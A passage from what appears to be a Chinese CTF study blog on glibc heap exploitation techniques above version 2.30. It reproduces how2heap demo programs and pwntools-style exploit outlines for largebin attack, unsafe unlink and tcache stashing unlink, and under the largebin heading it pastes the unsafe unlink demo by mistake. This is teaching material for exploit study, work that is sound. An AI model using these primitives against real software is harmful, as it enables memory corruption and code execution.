后再申请回来实现，由于malloc并不会清空chunk内容，因此可以读取到残留的libc的指针。</p>\n<p>而在没有show相关输出chunk内容的函数时，考虑通过<code>_IO_2_1_stdout_</code> 来leak<br>\n基本原理就是partial overwrite 覆盖unsorted  bin中的libc地址，分配到__IO_2_1_stdout的位置，然后改写来完成leak</p>\n<h1>Basic tricks up to 2.30</h1>\n<p>在2.30以上的版本，我认为需要掌握的基本技术主要包括:</p>\n<ul>\n<li>[x] largebin attack</li>\n<li>[x] tcache stashing unlink attack</li>\n<li>[x] unsafe unlink</li>\n<li>[x] tcache poison</li>\n<li>[x] house of botcake</li>\n<li>[x] decrypt safe_unlink</li>\n<li>[x] house of pig</li>\n<li>[x] 堆布局</li>\n</ul>\n<p>这里结合how to heap源代码分析</p>\n<h2 id=\"Largebin-attack\">Largebin attack</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdint.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;assert.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">uint64_t</span> *chunk0_ptr;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tsetbuf(<span class=\"built_in\">stdout</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Welcome to unsafe unlink 2.0!\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Tested in Ubuntu 20.04 64bit.\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;This technique can be used when you have a pointer at a known location to a region you can call unlink on.\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\\n&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">int</span> malloc_size = <span class=\"number\">0x420</span>; <span class=\"comment\">//we want to be big enough not to use tcache or fastbin</span></span><br><span class=\"line\">\t<span class=\"type\">int</span> header_size = <span class=\"number\">2</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\\n\\n&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\tchunk0_ptr = (<span class=\"type\">uint64_t</span>*) <span class=\"built_in\">malloc</span>(malloc_size); <span class=\"comment\">//chunk0</span></span><br><span class=\"line\">\t<span class=\"type\">uint64_t</span> *chunk1_ptr  = (<span class=\"type\">uint64_t</span>*) <span class=\"built_in\">malloc</span>(malloc_size); <span class=\"comment\">//chunk1</span></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;The global chunk0_ptr is at %p, pointing to %p\\n&quot;</span>, &amp;chunk0_ptr, chunk0_ptr);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;The victim chunk we are going to corrupt is at %p\\n\\n&quot;</span>, chunk1_ptr);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;We create a fake chunk inside chunk0.\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;We setup the size of our fake chunk so that we can bypass the check introduced in https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d6db68e66dff25d12c3bc5641b60cbd7fb6ab44f\\n&quot;</span>);</span><br><span class=\"line\">\tchunk0_ptr[<span class=\"number\">1</span>] = chunk0_ptr[<span class=\"number\">-1</span>] - <span class=\"number\">0x10</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;We setup the &#x27;next_free_chunk&#x27; (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\\n&quot;</span>);</span><br><span class=\"line\">\tchunk0_ptr[<span class=\"number\">2</span>] = (<span class=\"type\">uint64_t</span>) &amp;chunk0_ptr-(<span class=\"keyword\">sizeof</span>(<span class=\"type\">uint64_t</span>)*<span class=\"number\">3</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;We setup the &#x27;previous_free_chunk&#x27; (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\\n&quot;</span>);</span><br><span class=\"line\">\tchunk0_ptr[<span class=\"number\">3</span>] = (<span class=\"type\">uint64_t</span>) &amp;chunk0_ptr-(<span class=\"keyword\">sizeof</span>(<span class=\"type\">uint64_t</span>)*<span class=\"number\">2</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Fake chunk fd: %p\\n&quot;</span>,(<span class=\"type\">void</span>*) chunk0_ptr[<span class=\"number\">2</span>]);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Fake chunk bk: %p\\n\\n&quot;</span>,(<span class=\"type\">void</span>*) chunk0_ptr[<span class=\"number\">3</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"type\">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;We shrink the size of chunk0 (saved as &#x27;previous_size&#x27; in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;It&#x27;s important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\\n&quot;</span>);</span><br><span class=\"line\">\tchunk1_hdr[<span class=\"number\">0</span>] = malloc_size;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;If we had &#x27;normally&#x27; freed chunk0, chunk1.previous_size would have been 0x430, however this is its new value: %p\\n&quot;</span>,(<span class=\"type\">void</span>*)chunk1_hdr[<span class=\"number\">0</span>]);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;We mark our fake chunk as free by setting &#x27;previous_in_use&#x27; of chunk1 as False.\\n\\n&quot;</span>);</span><br><span class=\"line\">\tchunk1_hdr[<span class=\"number\">1</span>] &amp;= ~<span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\\n\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">free</span>(chunk1_ptr);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"type\">char</span> victim_string[<span class=\"number\">8</span>];</span><br><span class=\"line\">\t<span class=\"built_in\">strcpy</span>(victim_string,<span class=\"string\">&quot;Hello!~&quot;</span>);</span><br><span class=\"line\">\tchunk0_ptr[<span class=\"number\">3</span>] = (<span class=\"type\">uint64_t</span>) victim_string;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Original value: %s\\n&quot;</span>,victim_string);</span><br><span class=\"line\">\tchunk0_ptr[<span class=\"number\">0</span>] = <span class=\"number\">0x4141414142424242</span>LL;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;New Value: %s\\n&quot;</span>,victim_string);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// sanity check</span></span><br><span class=\"line\">\tassert(*(<span class=\"type\">long</span> *)victim_string == <span class=\"number\">0x4141414142424242</span>L);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>核心思路:</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">malloc(<span class=\"number\">0x420</span>) <span class=\"comment\"># chunk A</span></span><br><span class=\"line\">malloc(<span class=\"number\">0x18</span>)</span><br><span class=\"line\"><span class=\"comment\">#And another chunk to prevent consolidate</span></span><br><span class=\"line\">malloc(<span class=\"number\">0x410</span>) <span class=\"comment\"># chunk B</span></span><br><span class=\"line\"><span class=\"comment\">#This chunk should be smaller than [p1] and belong to the same large bin</span></span><br><span class=\"line\">malloc(<span class=\"number\">0x18</span>)</span><br><span class=\"line\"><span class=\"comment\">#And another chunk to prevent consolidate</span></span><br><span class=\"line\">free(<span class=\"number\">0</span>)</span><br><span class=\"line\">malloc(<span class=\"number\">0x438</span>)</span><br><span class=\"line\"><span class=\"comment\">#Allocate a chunk larger than [p1] to insert [p1] into large bin</span></span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"comment\">#Free the smaller of the two --&gt; [p2]</span></span><br><span class=\"line\">edit(<span class=\"number\">0</span>, p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span>+p64(target2-<span class=\"number\">0x20</span>))</span><br><span class=\"line\"><span class=\"comment\">#最终addr1与addr2地址中的值均被赋成了victim即chunk_B的chunk header地址最终addr1与addr2地址中的值均被赋成了victim即chunk_B的chunk header地址</span></span><br><span class=\"line\">malloc(<span class=\"number\">0x438</span>)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>, p64(recover)*<span class=\"number\">2</span>) <span class=\"comment\"># 修复large bin attack </span></span><br></pre></td></tr></table></figure>\n<p><strong>修复:</strong><br>\n可以通过gdb查看未更改时chunk A的fd和bk，然后修复，免于计算</p>\n<p><strong>限制:</strong></p>\n<ul>\n<li>需要一次UAF</li>\n</ul>\n<p><strong>效果:</strong></p>\n<ul>\n<li>在2.30以上可以在任意地址写入一个libc地址</li>\n</ul>\n<h2 id=\"unsafe-unlink\">unsafe unlink</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdint.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;assert.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">uint64_t</span> *chunk0_ptr;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tsetbuf(<span class=\"built_in\">stdout</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Welcome to unsafe unlink 2.0!\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Tested in Ubuntu 20.04 64bit.\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;This technique can be used when you have a pointer at a known location to a region you can call unlink on.\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\\n&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">int</span> malloc_size = <span class=\"number\">0x420</span>; <span class=\"comment\">//we want to be big enough not to use tcache or fastbin</span></span><br><span class=\"line\">\t<span class=\"type\">int</span> header_size = <span class=\"number\">2</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\\n\\n&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\tchunk0_ptr = (<span class=\"type\">uint64_t</span>*) <span class=\"built_in\">malloc</span>(malloc_size); <span class=\"comment\">//chunk0</span></span><br><span class=\"line\">\t<span class=\"type\">uint64_t</span> *chunk1_ptr  = (<span class=\"type\">uint64_t</span>*) <span class=\"built_in\">malloc</span>(malloc_size); <span class=\"comment\">//chunk1</span></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;The global chunk0_ptr is at %p, pointing to %p\\n&quot;</span>, &amp;chunk0_ptr, chunk0_ptr);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;The victim chunk we are going to corrupt is at %p\\n\\n&quot;</span>, chunk1_ptr);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;We create a fake chunk inside chunk0.\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;We setup the size of our fake chunk so that we can bypass the check introduced in https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d6db68e66dff25d12c3bc5641b60cbd7fb6ab44f\\n&quot;</span>);</span><br><span class=\"line\">\tchunk0_ptr[<span class=\"number\">1</span>] = chunk0_ptr[<span class=\"number\">-1</span>] - <span class=\"number\">0x10</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;We setup the &#x27;next_free_chunk&#x27; (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\\n&quot;</span>);</span><br><span class=\"line\">\tchunk0_ptr[<span class=\"number\">2</span>] = (<span class=\"type\">uint64_t</span>) &amp;chunk0_ptr-(<span class=\"keyword\">sizeof</span>(<span class=\"type\">uint64_t</span>)*<span class=\"number\">3</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;We setup the &#x27;previous_free_chunk&#x27; (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\\n&quot;</span>);</span><br><span class=\"line\">\tchunk0_ptr[<span class=\"number\">3</span>] = (<span class=\"type\">uint64_t</span>) &amp;chunk0_ptr-(<span class=\"keyword\">sizeof</span>(<span class=\"type\">uint64_t</span>)*<span class=\"number\">2</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Fake chunk fd: %p\\n&quot;</span>,(<span class=\"type\">void</span>*) chunk0_ptr[<span class=\"number\">2</span>]);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Fake chunk bk: %p\\n\\n&quot;</span>,(<span class=\"type\">void</span>*) chunk0_ptr[<span class=\"number\">3</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"type\">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;We shrink the size of chunk0 (saved as &#x27;previous_size&#x27; in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;It&#x27;s important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\\n&quot;</span>);</span><br><span class=\"line\">\tchunk1_hdr[<span class=\"number\">0</span>] = malloc_size;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;If we had &#x27;normally&#x27; freed chunk0, chunk1.previous_size would have been 0x430, however this is its new value: %p\\n&quot;</span>,(<span class=\"type\">void</span>*)chunk1_hdr[<span class=\"number\">0</span>]);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;We mark our fake chunk as free by setting &#x27;previous_in_use&#x27; of chunk1 as False.\\n\\n&quot;</span>);</span><br><span class=\"line\">\tchunk1_hdr[<span class=\"number\">1</span>] &amp;= ~<span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\\n\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">free</span>(chunk1_ptr);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"type\">char</span> victim_string[<span class=\"number\">8</span>];</span><br><span class=\"line\">\t<span class=\"built_in\">strcpy</span>(victim_string,<span class=\"string\">&quot;Hello!~&quot;</span>);</span><br><span class=\"line\">\tchunk0_ptr[<span class=\"number\">3</span>] = (<span class=\"type\">uint64_t</span>) victim_string;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Original value: %s\\n&quot;</span>,victim_string);</span><br><span class=\"line\">\tchunk0_ptr[<span class=\"number\">0</span>] = <span class=\"number\">0x4141414142424242</span>LL;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;New Value: %s\\n&quot;</span>,victim_string);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// sanity check</span></span><br><span class=\"line\">\tassert(*(<span class=\"type\">long</span> *)victim_string == <span class=\"number\">0x4141414142424242</span>L);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>核心思路:</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># chunk 0 ptr store in &amp;ptr</span></span><br><span class=\"line\"></span><br><span class=\"line\">malloc(<span class=\"number\">0x420</span>) <span class=\"comment\"># not in fastbin or tcache</span></span><br><span class=\"line\">malloc(<span class=\"number\">0x420</span>) </span><br><span class=\"line\">edit(<span class=\"number\">0</span>, p64(<span class=\"number\">0</span>)+p64(fake_size)+p64(&amp;ptr-<span class=\"number\">0x18</span>)+p64(&amp;ptr-<span class=\"number\">0x10</span>)+p64(<span class=\"number\">0</span>)*k + p64(fake_prev_size)+p64(size)) <span class=\"comment\"># fakesize = 0x420-0x10</span></span><br><span class=\"line\"><span class=\"comment\"># need fake_prev_size = prev_size-0x10, sive.PREV_INUSE = 0</span></span><br></pre></td></tr></table></figure>\n<p><strong>限制:</strong></p>\n<ul>\n<li>overflow ,可以修改prev_inuse触发fake chunk  unlink and  consolidate</li>\n<li>主要适用于可以知道堆指针存储基址的情况，可以控制堆管理机构</li>\n</ul>\n<p><strong>效果:</strong></p>\n<ul>\n<li>可以将ptr处地址改写为&amp;ptr-8</li>\n</ul>\n<h2 id=\"tcache-stashing-unlink\">tcache stashing unlink</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;assert.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">long</span> stack_var[<span class=\"number\">0x10</span>] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">long</span> *chunk_lis[<span class=\"number\">0x10</span>] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">long</span> *target;</span><br><span class=\"line\"></span><br><span class=\"line\">    setbuf(<span class=\"built_in\">stdout</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;This file demonstrates the stashing unlink attack on tcache.\\n\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;This poc has been tested on both glibc-2.27, glibc-2.29 and glibc-2.31.\\n\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;This technique can be used when you are able to overwrite the victim-&gt;bk pointer. Besides, it&#x27;s necessary to alloc a chunk with calloc at least once. Last not least, 